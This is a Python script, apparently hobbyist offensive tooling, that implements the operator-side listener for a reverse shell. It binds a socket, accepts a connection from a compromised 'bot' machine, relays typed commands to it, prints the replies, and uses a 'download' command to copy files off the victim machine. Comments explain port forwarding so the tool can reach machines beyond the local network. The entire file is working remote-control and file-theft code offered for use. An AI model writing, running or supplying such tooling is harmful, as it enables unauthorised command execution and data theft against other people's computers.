#!/usr/bin/python3


import socket
import json
from termcolor import colored


def sendCommand(data, target): # Send a command to bot machines

    try:
        json_data = json.dumps(data) # Dump all of the data into a variable that can hold large byte amounts
        target.send(json_data.encode('utf-8')) # Send this information to bot machine
    
    except:
        print(colored('[!!]Error Occurred', 'red'))


def receiveInfo(target): # Function name is pretty easy, the function receives information from the bot 

    while True:
        try:
            data = target.recv(4096) # Receive data in 4096 byte chunks
            data = data.decode('utf-8') # Decode the data to utf-8 so we can read it
            return json.loads(data) # return the data to the previous function that called it
        except:
            continue


def reverseShell(target, ip): # This is the reverse shell function, neat >\(-_-)/<

    while True:
        try:
            
            command = input(str(ip) + '~$ ') # This is the command line interface we are using, it always appears while connected
            
            if command == 'cd': # Set certain statements to avoid bug moments
                
                print('You must enter a Directory')

            else: 
                
                sendCommand(command, target) # Send the command to the Bot
                
                if command == 'quit': # If we want to quit
                    break # Break the connection

                elif command[:8] == 'download': # Download Files Option

                    with open(command[9:], 'w') as download_file: # Open a file with name of Bot Machines File to copy

                        download_file_data = receiveInfo(target) # Receive the parts of this file
                        download_file.write(download_file_data) # Write this data to our own file
                    download_file.close() # Close our file to save our data

                else:
                
                    message = receiveInfo(target) # If no special commands, listen for a reply
                    print('<Bot ' + str(ip) + '>' '\n' + message) # Print this little message line to show the bot is replying 
        
        except:
            
            print(colored('[-]Error Occurred Connection Lost', 'red'))
            break


def main():

    print(colored("""
                                        ..:::::::::..
				  ..:::aad8888888baa:::..
			  .::::d:?88888888888?::8b::::.
			.:::d8888:?88888888??a888888b:::.
		  .:::d8888888a8888888aa8888888888b:::.
		 ::::dP::::::::88888888888::::::::Yb::::
		::::dP:::::::::Y888888888P:::::::::Yb::::
	   ::::d8:::::::::::Y8888888P:::::::::::8b::::
	  .::::88::::::::::::Y88888P::::::::::::88::::.
	  :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
	  :::::::Y88888888888P::|::Y88888888888P:::::::
	  ::::::::::::::::888:::|:::888::::::::::::::::
	  `:::::::::::::::8888888888888b::::::::::::::'
	   :::::::::::::::88888888888888::::::::::::::
		:::::::::::::d88888888888888:::::::::::::
		 ::::::::::::88::88::88:::88::::::::::::
		  `::::::::::88::88::88:::88::::::::::'
			`::::::::88::88::P::::88::::::::'
			  `::::::88::88:::::::88::::::'
				 ``:::::::::::::::::::''
					  ``:::::::::'
                                          
    """, 'red'))
    print("""
         Python Reverse Shell Listener
        """)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create an available socket connection, AF_INET & SOCK_STREAM are built in socket tools
    # AF_INET is used to determine that the host uses either an IPv4 or hostname
    # SOCK_STREAM is used to set the socket type, SOCK_STREAM is one of two universally useful forms of SOCK_****

    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Set the socket output SOL_SOCKET & SO_REUSEADDR are also built in socket tools 

    try:
        s.bind(("192.168.1.2", 6996)) # Bind the connection to this machines local IP address, at my chosen port
        # To have this set properly, you must make sure that you have port forwarding set up on your router,
        # If you do not have port forwarding set up on your network this program can only be used against local machines

        s.listen(1) # Listen for connections

        print(colored("[*] Listening for Incoming Connections", 'green'))

        target, ip = s.accept() # Accept incoming connection with socket .accept() function
        print(colored('[+]Connection Established From: %s' % str(ip), 'green'))

        reverseShell(target, ip) # Send the target, and their IP address to our reverse shell function

        s.close()
    except:
        print('[-]Error Occured')
        print(colored("""Troubleshooting Tips:
        
        - Check IP address
           - Run ' curl ifconfig.me ' for global IP (Listener)
           - Run ' ifconfig ' OR ' ip addr show ' for local IP (Host)
        - Check connection
           - Ensure that your device has a strong internet connection
        - Program was stopped
           - OR
        - Code is bugged and needs to be fixed
        """, 'red'))


if __name__ == '__main__':
    main()

#            ___
#         __/   \__
#        |_  ___  _|
#          /\   /\
#         / /   \ \
#         \ \   / /
#          \ \ / /  
#         >\(?_?)/<
#
# 01000001 01101110 01101111 01101110 01111001 01101101 01101111 01110101 01110011 
# 00110000 01101110 01111001 01111000

